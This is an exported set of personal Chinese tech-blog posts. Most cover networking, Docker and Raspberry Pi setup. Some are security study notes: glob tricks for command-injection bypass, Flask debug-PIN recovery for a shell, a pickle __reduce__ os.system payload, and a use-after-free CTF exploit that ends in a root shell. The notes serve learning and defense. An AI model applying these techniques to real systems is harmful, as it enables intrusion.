{"posts":[{"title":"手机特定应用 网络加载卡解决办法","content":"ipv6的坑 关闭了dhcp，联通的光猫 路由器还是会给分配ipv6的dns，离谱； 一通操作在管理员后台彻底干掉了ipv6的dns，终于解决问题 网速飞快 😎 ","link":"https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/"},{"title":"tailscale 只用ip 自建derper","content":"随着derp的不断更新，现在只有ip没有域名的情况下搭建已经简单很多了。 derp安装就不详细说了，直接看官网自己装就完事， 我自己是使用了大佬做的容器版本的 fredliang/derper ,大家也可以用这个 证书生成 由于没有域名，就要先自己生成个证书出来了，由于我是把derp部署在自己家里，拨号ip会变化，所用了DDNS，这里生成域名就要用DDNS使用的域名来生成证书 注意： 要替换 里面的域名用自己的，当然如果有固定的公网ip也可以直接用ip来搞，应该问题不大，证书生成命令忘记是从哪里抄的了..... openssl genrsa -out ca.key 2048 openssl req -new -x509 -days 365 -key ca.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=Acme Root CA&quot; -out ca.crt # 下面的命令要替换*.example.org openssl req -newkey rsa:2048 -nodes -keyout xxx.example.org.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=*.example.org&quot; -out server.csr # 下面的命令要替换xxx.example.org openssl x509 -req -extfile &lt;(printf &quot;subjectAltName=DNS:example.com,DNS:xxx.example.org&quot;) -days 365 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out xxx.example.org.crt 启动容器 然后就是巨长的启动容器命令 ，这里用了比较多的参数 ，逐一解释下： --restart always ： 容器自动重启 --net=container:gw : 和其他容器共享网络，这样子derp开放的端口就会开在我的网关容器上，这个大家视情况使用，我是因为自己搞了个容器做网关，专门用来映射端口到公网上，然后本来想要在gw的容器上配置iptable做端口转发到跑derp的容器上，但是研究了一天，不知道为什么udp都是只有收到的包，转发不出去啊，绝望。。。，无奈搞了这么个骚操作，直接和网关容器共享网络了，网络知识还是不够。。搞不懂为啥 -v /root/cert:/root/cert： 挂载证书目录 -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale ： 挂载目录到容器，为了打开derp对客户端的校验，因此需要挂载，不过好像只用挂载第二个就行了 -e DERP_VERIFY_CLIENTS=true ： 开启--verify-clients的校验 -e DERP_HTTP_PORT=-1 ： 禁用http端口，少开点端口，安全 -e DERP_DOMAIN=xxx.example.org ：设置自己的域名 -e DERP_CERT_MODE=manual: 设置证书模式，为自己指定的证书 -e DERP_CERT_DIR=/root/cert :指定证书目录 -e DERP_ADDR=:448 ： 指定开放的https端口 --name=derp ： 给容器起名字 docker run -d --restart always --net=container:gw -v /root/cert:/root/cert -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale -e DERP_VERIFY_CLIENTS=true -e DERP_HTTP_PORT=-1 -e DERP_DOMAIN=xxx.example.org -e DERP_CERT_MODE=manual -e DERP_CERT_DIR=/root/cert -e DERP_ADDR=:448 --name=derp fredliang/derper:5.26 修改ACL规则 ACL规则有两个地方比较重要，一个是我改了https的端口，没有用默认的，一定要加上，还有就是 InsecureForTests ，忽略掉证书错误，不然就连接不上去了（如果你的证书不是自己自签名的，而是真的话，就不用加这个了） 参考示例： &quot;derpMap&quot;: { &quot;OmitDefaultRegions&quot;: false, &quot;Regions&quot;: { &quot;900&quot;: { &quot;RegionID&quot;: 900, &quot;RegionCode&quot;: &quot;home&quot;, &quot;RegionName&quot;: &quot;home&quot;, &quot;Nodes&quot;: [{ &quot;Name&quot;: &quot;1&quot;, &quot;RegionID&quot;: 900, &quot;HostName&quot;: &quot;xxx.example.org&quot;, &quot;DERPPort&quot;: 448, //指定https端口 &quot;InsecureForTests&quot;: true, // 忽略证书错失 }], }, }, } 怎么搞DDNS这里就不详细写了 ","link":"https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/"},{"title":"sqlit使用时注意内存泄露","content":"sqlit使用时注意内存泄露 sqlite内存泄露 sqlite3_get_table------sqlite3_free_table(pazResult) sqlite3_exec-----sqlite3_free(*errmsg) (出现错误的情况下要调用) sqlite3_open-------sqlite3_close ","link":"https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/"},{"title":"命令注入部分特殊字符","content":"目录穿越 cd .?/.?/ cd .[[:punct:]]/ cd .[[:print:]]/ cd .[^1]/ shell通配符实现目录穿越 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [list] 匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同[^list] {str1,str2,…} 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合 IFS 由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成 CR 由 &lt; enter &gt; 产生 ! 执行 history 中的命令 专用字符集 字符 意义 [:alnum:] 任意数字或者字母 [:alpha:] 任意字母 [:space:] 空格 [:lower:] 小写字母 [:digit:] 任意数字 [:upper:] 任意大写字母 [:cntrl:] 控制符 [:graph:] 图形 [:print:] 可打印字符 [:punct:] 标点符号 [:xdigit:] 十六进制数 [:blank:] 空白字符 在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如[[:space:]] ","link":"https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/"},{"title":"python-flask debug模式 pin码计算","content":" 遇到了flask在生产环境开debug模式的...学习一下怎么利用 flask debug模式 getshell https://www.freebuf.com/articles/network/238485.html https://www.cnblogs.com/HacTF/p/8160076.html https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py 源码 https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/init.py 直接进入 xx.xx.xx.xx/console 可访问debug控制台页面 需要的参数值 probably_public_bits = [ 'admin',# username import getpass username=getpass.getuser() 'flask.app',# modname getattr(app, &quot;__module__&quot;, app.__class__.__module__) 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/lib64/python2.7/site-packages/flask/app.pyc' # getattr(sys.modules.get(modname), '__file__', None) ] private_bits = [ '280362549456921',# str(uuid.getnode()), /sys/class/net/eth0/address 网卡mac地址 str(0x4545454545) '54aea375-c51c-4a6a-95a8-9cf4727caadc'# get_machine_id()： /etc/machine-id or /proc/sys/kernel/random/boot_id + /proc/self/cgroup（第一行最后一个/后的一段） ] python3是app.py python2是app.pyc /proc/self/cgroup 内容会随着每个终端发生变化 取第一行，最后一个 / 后的字符内容，拼接到从前面两个文件读到的内容 该处为session-6042.scope 11:memory:/user.slice/user-0.slice/session-6042.scope 10:perf_event:/ 9:devices:/user.slice 8:freezer:/ 7:rdma:/ 6:pids:/user.slice/user-0.slice/session-6042.scope 5:blkio:/ 4:net_cls,net_prio:/ 3:cpu,cpuacct:/ 2:cpuset:/ 1:name=systemd:/user.slice/user-0.slice/session-6042.scope 0::/user.slice/user-0.slice/session-6042.scope https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed 该提交修改了计算pin方式，使用sha1，不再使用md5，生成pin的代码还是需要根据版本尝试才可以。。 ","link":"https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/"},{"title":"树莓派：openwrt搭建","content":"树莓派镜像选择 https://github.com/openfans-community-offical/Debian-Pi-Aarch64 选用无桌面加强版 的镜像就可以 OPENFANS-Debian-Buster-Desktop-Aarch64-XXXXXX.img 不需要在自己安装很多东西，基本都安装好了 openwrt docker 下列两个都可以 https://hub.docker.com/r/buddyfly/openwrt-aarch64 https://hub.docker.com/r/sulinggg/openwrt 树莓派网络配置 开启网卡混杂模式 sudo ip link set eth0 promisc on docker 网络创建 docker network create -d macvlan --subnet=192.168.8.0/24 --gateway=192.168.8.1 -o parent=eth0 macnet 可执行 docker network ls 查看创建的网络 关于macvlan相关内容下面补充，大概就是一个桥接吧，但是又有区别 3. 拉取镜并启动容器 docker pull buddyfly/openwrt-aarch64 #拉取镜像 docker run --restart always --name openwrt -d --network macnet --privileged buddyfly/openwrt-aarch64 /sbin/init #启动容器，自动重启，命名容器名，后台运行，加入macnet网络，容器内命令执行权限，定义容器启动后执行的命令 进入容器修改网络 docker exec -it openwrt bash #进入容器bash界面 vi /etc/config/network config interface 'loopback' option ifname 'lo' option proto 'static' option ipaddr '127.0.0.1' option netmask '255.0.0.0' config globals 'globals' option ula_prefix 'fd5d:af65:56ed::/48' config interface 'lan' option type 'bridge' option ifname 'eth0' option proto 'static' option ipaddr '192.168.8.10' option netmask '255.255.255.0' option ip6assign '60' option gateway '192.168.8.1' option dns '192.168.8.1' 重启网络 /etc/init.d/network restart #重启openwrt的网络 树莓派网络配置 /etc/network/interfaces # interfaces(5) file used by ifup(8) and ifdown(8) # Include files from /etc/network/interfaces.d: source-directory /etc/network/interfaces.d ## Used dhcp ip address set eth0 inet to dhcp, ## or used static ip address set eth0 to static ## and change other ip settings. ## If you wanna let settings to take effect, ## uncomment symbol in front. auto eth0 allow-hotplug eth0 #iface eth0 inet dhcp iface eth0 inet static address 192.168.8.103 netmask 255.255.255.0 gateway 192.168.8.1 dns-nameservers 192.168.8.10 修改openwrt配置 默认密码：root-password 关闭DHCP，ipv6的也要关掉 开机启动脚本修改 在/boot/rc-local中加入下面的，来让树莓派本身的流量也走openwrt 没有这个需求的不改也行 ip link add link eth0 dev eth0.01 type macvlan mode bridge sleep 10 ifconfig eth0.01 192.168.8.11/24 route add 192.168.8.10 dev eth0.01 route add default gw 192.168.8.10 dev eth0.01 --macvlan的解释-2021.07.07更新 macvlan 在第一步中有创建 docker使用的macvlan，目的是为了实现和桥接一样的模式，共享物理网卡使用的外部网络。使用了bridge模式。 该模式下虚拟出来的网卡是无法直接与父网卡通信的，因此树莓派本身的流量无法到达openwrt 为了能够让树莓派本身的流量也经过openwrt出去，所以后面重新创建了一块虚拟网卡，并修改路由，指定默认网关到openwrt的ip，同时指定该路由网卡使用虚拟网卡 ","link":"https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/"},{"title":"python pickle","content":"控制如何反序列化 __reduce__ __reduce_ex__ 指定pickle协议版本 class Test(object): def __reduce__(self): cmd = &quot;whoami&quot; #return __import__('os').system,('whoami',) return (os.system,('whoami',)) __reduce__ex__ 限制全局变量 find_class https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict import builtins import io import pickle safe_builtins = { 'range', 'complex', 'set', 'frozenset', 'slice', } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() ","link":"https://rainerhu.github.io/post/python-pickle/"},{"title":"UAF","content":"简介 use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。 虚函数 在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据，虚函数指针指向虚函数表 对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据 #include &lt;iostream&gt; class A{ public: int a; A():a(0x1) {} virtual void foo(){ std::cout &lt;&lt; &quot;A::foo()&quot; &lt;&lt; std::endl; } void bar(){ std::cout &lt;&lt; &quot;A::bar()&quot; &lt;&lt; std::endl; } }; class B: public A{ public: int b; B():A(),b(0x2) {} void foo(){ std::cout &lt;&lt; &quot;B::foo()&quot; &lt;&lt; std::endl; } }; class C: public B{ public: int c; C():B(),c(0x3) {} void foo(){ std::cout &lt;&lt; &quot;C::foo()&quot; &lt;&lt; std::endl; } }; int main() { A a; B b; C c; B *p = &amp;c; p-&gt;foo(); std::cout &lt;&lt; sizeof(int) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(int*) &lt;&lt; std::endl; return 0; } (gdb) p a $1 = {_vptr.A = 0x555555557d90 &lt;vtable for A+16&gt;, a = 1} (gdb) p b $2 = {&lt;A&gt; = {_vptr.A = 0x555555557d78 &lt;vtable for B+16&gt;, a = 1}, b = 2} (gdb) p c $3 = {&lt;B&gt; = {&lt;A&gt; = {_vptr.A = 0x555555557d60 &lt;vtable for C+16&gt;, a = 1}, b = 2}, c = 3} SLAB &amp;&amp; SLUB 内存管理机制，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配;但是，SLAB机制对内核对象的类型十分挑剔，只有类型和大小都完全一致的对象才能重用其空间;这就好比是装过鸡的笼子是不允许再去关兔子了,哪怕鸡和兔子的大小一样; 但是,和SLAB相比,SLUB对对象类型就没有限制,两个对象只要大小差不多就可以重用同一块内存,而不在乎类型是否相同; 示例代码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { char *p1; p1 = (char *) malloc(sizeof(char)*10); memcpy(p1,&quot;hello&quot;,10); printf(&quot;p1 addr:%x,%s\\n&quot;,p1,p1); free(p1); char *p2; p2 = (char *)malloc(sizeof(char)*10); //申请同样大小的内存 memcpy(p1,&quot;world&quot;,10); //向p1中拷贝 printf(&quot;p2 addr:%x,%s\\n&quot;,p2,p2);// 输出p2 return 0; } 输出 p1 addr:d21260,hello p2 addr:d21260,world CTF-示例 #include &lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); } protected: int age; string name; public: virtual void introduce(){ cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } 有三个类，Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。 可以根据代码看出来，要想利用UAF，就要先选free，然后after，再use。 我们首先要看下要申请多大的内存空间合适，可以把这个代码编译一下，之后用IDA反汇编看下伪代码,可以看到需要0x30，就是48的内存。这个结果会因编译的时候使用的系统不同存在差异，这个CTF题原本给的编译出来的程序反汇编就是0x18的，是24 v3 = (Man *)operator new(0x30uLL); Man::Man(v3, &amp;p_name, 25); m = v3; 也可以用gdb调试看到大小是48 Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54 54 cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; (gdb) p *m $1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;} (gdb) p sizeof(*m) $2 = 48 然后找到introduce调用的地方，可以看到是根据虚函数指针，然后+1调用到的，所以我们要是想调用到given_shell 就是要覆盖改写虚函数指针的值 (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m); (*((void (__fastcall **)(Human *))w-&gt;_vptr_Human + 1))(w); 然后寻找man 虚函数表。找到man的构造函数 void __cdecl Man::Man(Man *const this, std::string *p_name, int age) { Human::Human(this); this-&gt;_vptr_Human = (int (**)(...))&amp;off_403D80; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;this-&gt;name, p_name); this-&gt;age = age; } 跟进_vptr_Human的off_403D80处，可以看到man的虚函数表 .data.rel.ro:0000000000403D70 ; `vtable for'Man .data.rel.ro:0000000000403D70 _ZTV3Man dq 0 ; offset to this .data.rel.ro:0000000000403D78 dq offset _ZTI3Man ; `typeinfo for'Man .data.rel.ro:0000000000403D80 off_403D80 dq offset _ZN5Human10give_shellEv .data.rel.ro:0000000000403D80 ; DATA XREF: Man::Man(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+20↑o .data.rel.ro:0000000000403D80 ; Human::give_shell(void) .data.rel.ro:0000000000403D88 dq offset _ZN3Man9introduceEv ; Man::introduce(void) .data.rel.ro:0000000000403D90 public _ZTV5Human ; weak .data.rel.ro:0000000000403D90 ; `vtable for'Human .data.rel.ro:0000000000403D90 _ZTV5Human dq 0 ; offset to this .data.rel.ro:0000000000403D98 dq offset _ZTI5Human ; `typeinfo for'Human .data.rel.ro:0000000000403DA0 off_403DA0 dq offset _ZN5Human10give_shellEv .data.rel.ro:0000000000403DA0 ; DATA XREF: Human::Human(void)+C↑o .data.rel.ro:0000000000403DA0 ; Human::~Human()+C↑o .data.rel.ro:0000000000403DA0 ; Human::give_shell(void) .data.rel.ro:0000000000403DA8 dq offset _ZN5Human9introduceEv ; Human::introduce(void) .data.rel.ro:0000000000403DB0 ; public Woman : 可以看到，虚函数表中0x0000000000403D80地址就是man虚函数指针的值，而m-&gt;introduce()调用时，调用的其实是0x0000000000403D80+0x8=0000000000403D88 ，_vptr_Human上加了0x8调用到了introduce。我们想要让他调用到give_shell就只需要将_vptr_Human的值覆盖为0x0000000000403D80-0x8=0x0000000000403D78 这个值也可以通过gdb调试看到，打断点之后info vtbl *m就能看到对用的虚函数的表，或者直接查看变量结构也可以看到，我们还可以根据m的指针值，看下man的内存，可以看到第一块放的就是虚函数的指针0x00403d80 Starting program: /home/kali/uaf/uaf \\ Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54 54 cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; (gdb) p *m $1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;} (gdb) info vtbl *m vtable for 'Human' @ 0x403d80 (subobject @ 0x416eb0): [0]: 0x40157e &lt;Human::give_shell()&gt; [1]: 0x401700 &lt;Man::introduce()&gt; (gdb) x /10 0x403d80 0x403d80 &lt;_ZTV3Man+16&gt;: 0x000000000040157e 0x0000000000401700 0x403d90 &lt;_ZTV5Human&gt;: 0x0000000000000000 0x0000000000403de0 0x403da0 &lt;_ZTV5Human+16&gt;: 0x000000000040157e 0x000000000040159a 0x403db0 &lt;_ZTI5Woman&gt;: 0x00007ffff7fa6c98 0x0000000000402087 0x403dc0 &lt;_ZTI5Woman+16&gt;: 0x0000000000403de0 0x00007ffff7fa6c98 (gdb) p m $3 = (Human *) 0x416eb0 (gdb) x /10x 0x416eb0 0x416eb0: 0x00403d80 0x00000000 0x00000019 0x00000000 0x416ec0: 0x00416ed0 0x00000000 0x00000004 0x00000000 0x416ed0: 0x6b63614a 0x00000000 现在我们已经确认了 需要48的空间 需要把_vptr_Human 的值覆盖为0x0000000000403D78 然后尝试一下 root@kali:/home/kali/uaf# python -c &quot;print('\\x78\\x3d\\x40\\x00\\x00\\x00\\x00\\x00')&quot; &gt; poc root@kali:/home/kali/uaf# ./uaf 48 poc 1. use 2. after 3. free 3 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 1 # id uid=0(root) gid=0(root) groups=0(root) 注意事项：复现的时候自己编译要注意关掉PIE,不然地址会被随机化处理，只有低两位固定 g++ uaf.cpp -o uaf -g -no-pie CVE-2011-3874-zergRush 安卓UAF漏洞，通过缓冲区溢出，控制free任意地址 代码整个流程就是从data中读取数据放入tmp中，以空格为分割，然后，调用strdup申请内存复制tmp中内容，将指针放入argv数组中，然后再对argv中每个指针进行free操作。 void FrameworkListener::dispatchCommand(SocketClient *cli, char *data) { FrameworkCommandCollection::iterator i; int argc = 0; char *argv[FrameworkListener::CMD_ARGS_MAX]; char tmp[255]; char *p = data; char *q = tmp; bool esc = false; bool quote = false; int k; memset(argv, 0, sizeof(argv)); memset(tmp, 0, sizeof(tmp)); while(*p) { ... *q = *p++; //参数截取分支 if (!quote &amp;&amp; *q == ' ') { *q = '\\0'; argv[argc++] = strdup(tmp); memset(tmp, 0, sizeof(tmp)); q = tmp; continue; } q++; } argv[argc++] = strdup(tmp); .... int j; for (j = 0; j &lt; argc; j++) free(argv[j]); return; } 需要关注一点，字符指针数组argv是存在缓冲区溢出的，长度是16。 构造输入 cmd p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 \\x78\\x56\\x34\\x12 可以实现free掉 0x12345678处的内存 利用溢出free任意地址是如何实现的呢，关键就是从argv溢出到tmp 在循环不断存入p15之后，argv已经满了，之后读入p16，会将p16的指针存入tmp[0] - tmp[3]，之后继续读入我们构造的地址 首先，会将地址存入tmp中，会覆盖掉tmp[0] - tmp[3]，也就是将argv[16]存放的指针地址给覆盖掉了，之后再将此块数据申请一块内存，把指针给argv[17],其实也是tmp的tmp[4] - tmp[7] 之后循环free的时候，在free[argv[16]]的时候就会free掉我们写入的特定地址 之后再次调用这个函数，执行到strdup(tmp)的时候就可以分配一块可控制大小的内存，可以将刚才free掉的内存分配到，然后对这块内存进行写入数据。进行后续的利用 小结 存在有指针在释放后还会被继续使用的逻辑 可以控制free掉任意指针的内存，然后再申请该内存，写入数据 两种情况都会导致UAF，第二种会比较少见也更加隐蔽，一般需要其他漏洞才能做到 ","link":"https://rainerhu.github.io/post/uaf/"},{"title":"命令记录","content":"树莓派 查看温度 vcgencmd measure_temp centos 重启网络 service network restart screen 常用命令: screen -S name #创建一个名字为name的会话 screen -r name #恢复到离开前创建的name会话的工作界面 screen -ls screen #会列出当前存在的会话列表 exit #会提示：[screen is terminating]，表示已经成功退出screen会话 远程演示 首先演示者先在服务器上执行 screen -S test 创建一个screen会话， 观众可以链接到远程服务器上执行screen -x test 观众屏幕上就会出现和演示者同步。 cmder 利用Tab，自动路径补全； 利用Ctrl+T建立新页签；利用Ctrl+W关闭页签; 利用Ctrl+Tab切换页签; Alt+F4：关闭所有页签 Alt+Shift+1：开启cmd.exe Alt+Shift+2：开启powershell.exe Alt+Shift+3：开启powershell.exe (系统管理员权限) Ctrl+1：快速切换到第1个页签 Ctrl+n：快速切换到第n个页签( n值无上限) Alt + enter： 切换到全屏状态； Ctr+r 历史命令搜索 git 代理 git config --global --unset http.proxy git config --global --unset https.proxy git config --global http.proxy 'socks5://127.0.0.1:1086' git config --global https.proxy 'socks5://127.0.0.1:1086' ","link":"https://rainerhu.github.io/post/ming-ling-ji-lu/"},{"title":"docker常用命令记录","content":"基础类 查看docker信息 # 查看docker版本 docker version # 显示docker系统的信息 docker info # 日志信息 docker logs # 故障检查 service docker status # 启动关闭docker sudo service docker start|stop 日志类 查看容器日志 docker logs -f &lt;容器名orID&gt; docker daemon 日志位置 根据系统不同各不相同 * Ubuntu - /var/log/upstart/docker.log * Boot2Docker - /var/log/docker.log * Debian GNU/Linux - /var/log/daemon.log * CentOS - /var/log/daemon.log | grep docker * Fedora - journalctl -u docker.service * Red Hat Enterprise Linux Server - /var/log/messages | grep docker docker ps没有响应 日志查询 # grep 所有容器的config.json docker logs [conID] # 确认问题后 # 该config.json 中有该容器1号进程的pid kill -9 pid 容器类 docker容器可以理解为在沙盒中运行的进程。 这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 环境等等。但这个沙盒默认是不会运行任何程序的。你需要在沙盒中运行一个进程来启动某一个容器。这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全的停止。 查看容器信息 # 查看当前运行的容器 docker ps # 查看全部容器 docker ps -a # 查看全部容器的id和信息 docker ps -a -q # 查看一个正在运行容器进程，支持 ps 命令参数 docker top # 查看容器的示例id sudo docker inspect -f '{{.Id}}' [id] # 检查镜像或者容器的参数，默认返回 JSON 格式 docker inspect # 返回 ubuntu:14.04 镜像的 docker 版本 docker inspect --format '{{.DockerVersion}}' ubuntu:14.04 容器同步命令 # 保存对容器的修改 docker commit # 对比容器的改动 docker diff # 附加到一个运行的容器上 docker attach 容器操作命令 创建删除容器 # 创建一个容器命名为 test 使用镜像daocloud.io/library/ubuntu docker create -it --name test daocloud.io/library/ubuntu # 创建并启动一个容器 名为 test 使用镜像daocloud.io/library/ubuntu docker run --name test daocloud.io/library/ubuntu # 删除一个容器 docker rm [容器id] # 删除所有容器 docker rm `docker ps -a -q` # 根据Dockerfile 构建 docker build -t [image_name] [Dockerfile_path] docker容器随系统自启 docker run --restart=always no – 默认值，如果容器挂掉不自动重启 on-failure – 当容器以非 0 码退出时重启容器,同时可接受一个可选的最大重启次数参数 (e.g. on-failure:10). always – 不管退出码是多少都要重启 容器资源限制参数 # 限制内存最大使用 -m 1024m --memory-swap=1024m # 限制容器使用CPU --cpuset-cpus=&quot;0,1&quot; 把一个正在运行的容器保存为镜像 docker commit &lt;CONTAIN-ID&gt; &lt;IMAGE-NAME&gt; 启动停止容器等操作 docker start|stop|restart [id] # 暂停|恢复 某一容器的所有进程 docker pause|unpause [id] # 杀死一个或多个指定容器进程 docker kill -s KILL [id] # 停止全部运行的容器 docker stop `docker ps -q` # 杀掉全部运行的容器 docker kill -s KILL `docker ps -q` 交互式进入容器 sudo docker exec -it {{containerName or containerID}} bash 查看容器的root用户密码 docker logs &lt;容器名orID&gt; 2&gt;&amp;1 | grep '^User: ' | tail -n1 因为Docker容器启动时的root用户的密码是随机分配的。所以，通过这种方式就可以得到容器的root用户的密码了 容器于宿主拷贝文件 docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH # 本地文件上传到对应容器的目录 docker cp local.sh [CONTAINERid]:[TagPath] 此命令为高版本docker才有，当然1.11+肯定包含 运行一个新容器，同时为它命名、端口映射、文件夹映射 以redmine镜像为例 docker run --name redmine -p 9003:80 -p 9023:22 -d -v /var/redmine/files:/redmine/files -v /var/redmine/mysql:/var/lib/mysql sameersbn/redmine 一个容器连接到另一个容器 docker run -i -t --name sonar -d -link mmysql:db tpires/sonar-server sonar 导入导出容器 # 支持远程文件 .tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz docker import # 导出 docker export [id] &gt;~/Downloads/ubuntu_nexus.tar 导出后导入（exported-imported)）的容器会丢失所有的提交历史，无法回滚。 镜像操作 远程镜像 docker login docker search # 搜索处收藏数不小于 3 ，并且能够自动化构建的 django 镜像，并且完整显示镜像描述 docker search -s 3 --automated --no-trunc django docker pull # 拉取ubuntu最新的镜像 docker pull ubuntu:latest # 服务器拉取个人动态，可选择时间区间 docker events # 拉取个人从 2015/07/20 到 2015/08/08 的个人动态 docker events --since=&quot;20150720&quot; --until=&quot;20150808&quot; 镜像同步操作 # 标记本地镜像，将其归入某一仓库 docker tag # 将 ID 为 5db5f84x1261 的容器标记为 mine/lnmp:0.2 镜像 docker tag 5db5f84x1261 mine/lnmp:0.2 # 将镜像推送至远程仓库，默认为 Docker Hub docker push 本地镜像 # 列出本地所有镜像 docker images # 本地镜像名为 ubuntu 的所有镜像 docker images ubuntu # 查看指定镜像的创建历史 docker history [id] # 本地移除一个或多个指定的镜像 docker rmi # 移除本地全部镜像 docker rmi `docker images -a -q` # 指定镜像保存成 tar 归档文件， docker load 的逆操作 docker save # 将镜像 ubuntu:14.04 保存为 ubuntu14.04.tar 文件 docker save -o ubuntu14.04.tar ubuntu:14.04 # 从 tar 镜像归档中载入镜像， docker save 的逆操作 docker load # 上面命令的意思是将 ubuntu14.04.tar 文件载入镜像中 docker load -i ubuntu14.04.tar docker load &lt; /home/save.tar # 构建自己的镜像 docker build -t &lt;镜像名&gt; &lt;Dockerfile路径&gt; docker build -t xx/gitlab . 保存后再加载（saved-loaded）的镜像不会丢失提交历史和层，可以回滚 重新查看container的stdout # 启动top命令，后台运行 $ ID=$(sudo docker run -d ubuntu /usr/bin/top -b) # 获取正在running的container的输出 $ sudo docker attach $ID top - 02:05:52 up 3:05, 0 users, load average: 0.01, 0.02, 0.05 Tasks: 1 total, 1 running, 0 sleeping, 0 stopped, 0 zombie Cpu(s): 0.1%us, 0.2%sy, 0.0%ni, 99.7%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 373572k total, 355560k used, 18012k free, 27872k buffers Swap: 786428k total, 0k used, 786428k free, 221740k cached ^C$ $ sudo docker stop $ID docker run 后台运行(-d)、并暴露端口 如果想要其他主机访问,不能使用127.0.0.1需要使用0.0.0.0作为ip地址 127.0.0.1仅能主机访问,是回环地址 docker run -d -p 127.0.0.1:33301:22 centos6-ssh run 命令详解 -a, --attach=[] Attach to STDIN, STDOUT or STDERR 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项 --add-host=[] Add a custom host-to-IP mapping (host:ip) --blkio-weight=0 Block IO (relative weight), between 10 and 1000 -c, --cpu-shares=0 CPU shares (relative weight) --cap-add=[] Add Linux capabilities 